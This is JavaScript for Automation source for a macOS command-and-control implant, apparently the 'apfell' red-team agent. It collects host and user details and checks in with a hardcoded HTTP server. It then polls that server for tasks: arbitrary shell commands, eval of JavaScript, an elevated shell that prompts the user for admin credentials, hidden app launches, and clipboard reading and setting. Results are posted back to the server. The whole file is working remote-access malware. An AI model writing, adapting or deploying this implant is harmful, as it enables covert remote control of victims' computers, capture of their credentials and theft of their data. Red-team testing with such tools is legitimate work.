ObjC.import('Cocoa');
ObjC.import('Foundation'); //there by default I think, but safe to include anyway
ObjC.import('stdlib');
var currentApp = Application.currentApplication();
currentApp.includeStandardAdditions = true;
//--------------IMPLANT INFORMATION-----------------------------------
class implant{
	constructor(){
		this.procInfo = $.NSProcessInfo.processInfo;
		this.hostInfo = $.NSHost.currentHost;
		this.id = -1;
		this.user = ObjC.unwrap(this.procInfo.userName);
		this.fullName = ObjC.unwrap(this.procInfo.fullUserName);
		//every element in the array needs to be unwrapped
		this.ip = ObjC.unwrap(this.hostInfo.addresses); //probably just need [0]
		this.pid = this.procInfo.processIdentifier;
		//every element in the array needs to be unwrapped
		this.host = ObjC.unwrap(this.hostInfo.names); //probably just need [0]
		this.killdate = "";
		//this is a dictionary, but every 'value' needs to be unwrapped
		this.environment = ObjC.unwrap(this.procInfo.environment);
		this.uptime = this.procInfo.systemUptime;
		//every element in the array needs to be unwrapped
		this.args = ObjC.unwrap(this.procInfo.arguments);
		this.payload_type = 'apfell-jxa';	
		this.osVersion = this.procInfo.operatingSystemVersionString;
	}
}
apfell = new implant();
//--------------Basic C2 INFORMATION----------------------------------------
//https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Classes
class baseC2{
	//To create your own C2, extend this class and implement the required functions
	//The main code depends on the mechanism being C2 with these functions.
	//   the implementation of the functions doesn't matter though
	constructor(interval){
		this.interval = interval; //seconds between callbacks
	}
	getInterval(){
		return this.interval;
	}
	checkin(){
		//check in with c2 server
	}
	getTasking(){
		//reach out to wherever to get tasking
	}
	getConfig(){
		//gets the current configuration for tasking
	}
	postResponse(){
		//output a response to a task
	}
	setConfig(){
		//updates the current configuration for how to get tasking
	}
}
//-------------RESTFUL C2 mechanisms ---------------------------------
class RestC2 extends baseC2{
	constructor(interval, baseurl){
		super(interval);
		this.baseurl = baseurl;
	}
	checkin(ip, pid, user, host){
		//get info about system to check in initially
		//needs IP, PID, user, host, payload_type
		//gets back a unique ID
		var info = {'ip':ip,'pid':pid,'user':user,'host':host,'payload_type':apfell.payload_type};
		//calls htmlPostData(url,data) to actually checkin
		var jsondata = this.htmlPostData("api/v1.0/callbacks/", JSON.stringify(info));	
		apfell.id = jsondata.id;
		return jsondata;
	}
	getTasking(){
		// http://ip/api/v1.0/tasks/callback/{implant.id}/nextTask
		var url = this.baseurl + "api/v1.0/tasks/callback/" + apfell.id + "/nextTask";
		var task = this.htmlGetData(url);
		return JSON.parse(task);
	}
	postResponse(urlEnding, data){
		//depending on the amount of data we're sending, we might need to chunk it
		//  current chunks at 8kB, but we can change that later
		var size=7000;
		console.log("total response size: " + data.length);
		for(var i = 0; i < data.length; i+=size){
			console.log(i);
			var chunk = data.substring(i,i+size);
			var post_data = {"response":chunk};
			var jsondata = this.htmlPostData(urlEnding, JSON.stringify(post_data));
			console.log("returned data: " + JSON.stringify(jsondata));
			//$.NSThread.sleepForTimeInterval(1);
		}
		return jsondata;
	}
	htmlPostData(urlEnding, sendData){
		while(true){
			try{ //for some reason it sometimes randomly fails to send the data, throwing a JSON error. loop to fix for now
				//console.log("posting: " + sendData + " to " + urlEnding);
				var url = this.baseurl + urlEnding;
				//console.log(url);
				var data = $.NSString.alloc.initWithUTF8String(sendData);
				var req = $.NSMutableURLRequest.alloc.initWithURL($.NSURL.URLWithString(url));
				req.setHTTPMethod($.NSString.alloc.initWithUTF8String("POST"));
				var postData = data.dataUsingEncodingAllowLossyConversion($.NSString.NSASCIIStringEncoding, true);
				var postLength = $.NSString.stringWithFormat("%d", postData.length);
				req.addValueForHTTPHeaderField(postLength, $.NSString.alloc.initWithUTF8String('Content-Length'));
				req.setHTTPBody(postData);
				var response = Ref();
				var error = Ref();
				var responseData = $.NSURLConnection.sendSynchronousRequestReturningResponseError(req,response,error);
				var resp = ObjC.unwrap($.NSString.alloc.initWithDataEncoding(responseData, $.NSUTF8StringEncoding));
				console.log(resp);
				var jsondata = JSON.parse(resp);
				return jsondata;
			}
			catch(error){
			}
		}
	}
	htmlGetData(url){
		return ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString(url)),$.NSUTF8StringEncoding));
	}
}
C2 = new RestC2(10, "http://192.168.0.119/"); //defaulting to 10 second callbacks
//-------------MAIN EXECUTION LOOP ----------------------------------
for(var i=0; i < apfell.ip.length; i++){
	ip = apfell.ip[i];
	if (ip.js.includes(".") && ip.js != "127.0.0.1"){
		console.log("found ip, checking in");
		C2.checkin(ip.js,apfell.pid,apfell.user,ObjC.unwrap(apfell.host[0]));
		break;
	}
}
shell = function(command){
	//simply run a shell command via doShellScript and return the response
	try{
		response = currentApp.doShellScript(command);
	}
	catch(error){
		response = error;
	}
	return response;
}
shell_elevated = function(command, prompt){
	//this will prompt the user for creds - if successful, they'll be cached for us for 5 min
	try{
		response = currentApp.doShellScript(command, {administratorPrivileges:true,withPrompt:prompt});
	}
	catch(error){
		response = error;
	}
	return response;
}
js = function(command){
	//simply eval a javascript string and return the response
	try{
		response = eval(command);
	}
	catch(error){
		response = error;
	}
	return response;
}
shell_api = function(path, args){
	//launch a program and args via ObjC bridge without doShellScript and return response
	try{
		var pipe = $.NSPipe.pipe;
		var file = pipe.fileHandleForReading;  // NSFileHandle
		var task = $.NSTask.alloc.init;
		task.launchPath = path; //'/bin/ps'
		task.arguments = args; //['aux']
		task.standardOutput = pipe;  // if not specified, literally writes to file handles 1 and 2
		task.standardError = pipe;
		task.launch; // Run the command `ps aux`
		var data = file.readDataToEndOfFile;  // NSData, potential to hang here?
		file.closeFile
		// Call -[[NSString alloc] initWithData:encoding:]
		data = $.NSString.alloc.initWithDataEncoding(data, $.NSUTF8StringEncoding)
		response = ObjC.unwrap(data);
	}
	catch(error){
		response = error;
	}
	return response;
}
launch_app = function(identifier){
	try{
		ObjC.import('AppKit')
		$.NSWorkspace.sharedWorkspace.launchAppWithBundleIdentifierOptionsAdditionalEventParamDescriptorLaunchIdentifier(
		  identifier,
		  $.NSWorkspaceLaunchAsync | $.NSWorkspaceLaunchAndHide | $.NSWorkspaceLaunchWithoutAddingToRecents ,
		  $.NSAppleEventDescriptor.nullDescriptor,
		  null
		)
		response = 'success';
	}
	catch(error){
		response = error;
	}
	return response;
}
clipboard_read = function(){
	try{
		return currentApp.theClipboard();
	}
	catch(error){
		return error;
	}
}
clipboard_set = function(data){
	try{
		currentApp.setTheClipboardTo(data);
		response = 'success';
	}
	catch(error){
		response = error;
	}
	return response;
}
sleepWakeUp = function(t){
	var response;
	console.log("checking for tasking");
	task = C2.getTasking();
	try{
		var command = ObjC.unwrap(task["command"]);
		if(command != "none"){
			var params = ObjC.unwrap(task["params"]);
			console.log(JSON.stringify(task));
			console.log("processing task");
			if(command == "shell"){
				output = shell(params);
			}
			else if(command == "shell_elevated"){
				//takes in a command and a prompt. if no prompt given, uses the default
				pieces = JSON.parse(params);
				//pieces should have a command and prompt field
				output = shell_elevated(pieces['command'], pieces['prompt']);
			}
			else if(command == "js"){
				output = js(params);
			}
			else if(command == "jsb"){
				output = ObjC.deepUnwrap(js(params));
			}
			else if(command == "shell_api"){
				//params should be the full path of the binary followed by all of the arguments
				pieces = JSON.parse(params);
				//pieces should have a path and an array of arguments
				output = shell_api(pieces['path'], pieces['args']);
			}
			else if(command == "launchapp"){
				//this should be the bundle identifier like com.apple.itunes to launch
				//it will launch hidden, asynchronously, and will be 'hidden' (still shows up in the dock though)
				output = launch_app(params);
			}
			else if(command == "clipboard"){
				if(params.length > 0){
					//this means we're setting the clipboard to something
					output = clipboard_set(params);
				}
				else{
					//this means we're just getting the clipboard
					output = clipboard_read();
				}
			}
			else if(command == "exit"){
				$.NSApplication.sharedApplication.terminate(this);
			}
			else {
				output = "command not supported: " + command + " " + params;
			}
			//response = {"response": output.toString()};
			//console.log(response);
			//console.log("posting response"); //tasking needs to give info on how to respond to that task
			C2.postResponse("api/v1.0/tasks/" + task.id, output);
		}
	}
	catch(error){
		console.log(error);
	}
	task["command"] = "none"; //reset just in case something goes weird
};
//https://stackoverflow.com/questions/37834749/settimout-with-javascript-for-automation
timer = $.NSTimer.scheduledTimerWithTimeIntervalRepeatsBlock(C2.interval, true, sleepWakeUp);
$.NSRunLoop.currentRunLoop.addTimerForMode(timer, "timer");
$.NSRunLoop.currentRunLoop.runModeBeforeDate("timer", $.NSDate.distantFuture);
//timer.invalidate will cause it to stop triggering